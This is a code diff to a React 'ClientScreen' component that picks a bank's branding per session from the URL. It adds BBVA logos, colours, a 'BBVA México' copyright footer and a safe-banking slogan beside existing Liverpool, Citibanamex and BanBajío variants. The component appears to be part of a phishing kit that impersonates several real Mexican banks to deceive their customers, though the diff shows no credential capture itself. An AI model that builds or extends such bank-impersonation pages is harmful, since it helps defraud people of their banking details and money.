@@ -8,6 +8,7 @@ import liverpoolLogo from '../assets/pngwing.com 2.png';
 import citibanamexLogo from '../assets/Banamex.png';
 import banbajioLogo from '../assets/banbajio_logo_oficial.png';
 import banbajioBackground from '../assets/IMG_0354.jpeg';
+import bbvaLogo from '@assets/bbva_logo.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -126,6 +127,17 @@ export default function ClientScreen() {
           <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'BBVA') {
+      return (
+        <header className="bg-[#072146] text-white p-4 text-center">
+          <img 
+            src={bbvaLogo} 
+            className="h-20 inline-block" 
+            alt="BBVA" 
+          />
+          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       return (
         <header className="bg-[#e10098] text-white p-4 text-center">
@@ -163,13 +175,33 @@ export default function ClientScreen() {
       return (
         <footer className="mt-auto">
           <div className="bg-gray-100 p-4 text-center text-sm">
-            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Aprende más</a>
-            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Ayuda</a>
-            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Términos y condiciones</a>
-            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Seguridad en línea</a>
+            <a href="#" className={`${
+              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
+              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              'text-[#e10098]'
+            } mx-2`}>Aprende más</a>
+            <a href="#" className={`${
+              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
+              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              'text-[#e10098]'
+            } mx-2`}>Ayuda</a>
+            <a href="#" className={`${
+              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
+              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              'text-[#e10098]'
+            } mx-2`}>Términos y condiciones</a>
+            <a href="#" className={`${
+              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
+              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              'text-[#e10098]'
+            } mx-2`}>Seguridad en línea</a>
           </div>
 
-          <div className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center text-sm`}>
+          <div className={`${
+            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
+            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
+            'bg-[#e10098]'
+          } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
               <a href="#" className="text-white mx-2">Contáctanos</a> |
               <a href="#" className="text-white mx-2">Aclaraciones</a> |
@@ -177,7 +209,11 @@ export default function ClientScreen() {
               <a href="#" className="text-white mx-2">Facebook</a> |
               <a href="#" className="text-white mx-2">Youtube</a>
             </div>
-            <div>© {sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 'Liverpool'} México 2024. Todos los Derechos Reservados</div>
+            <div>© {
+              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
+              sessionData.banco === 'BBVA' ? 'BBVA' :
+              'Liverpool'
+            } México 2024. Todos los Derechos Reservados</div>
           </div>
         </footer>
       );
@@ -192,6 +228,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-4 px-4">
           <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BBVA') {
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
         </div>
       );
     } else {
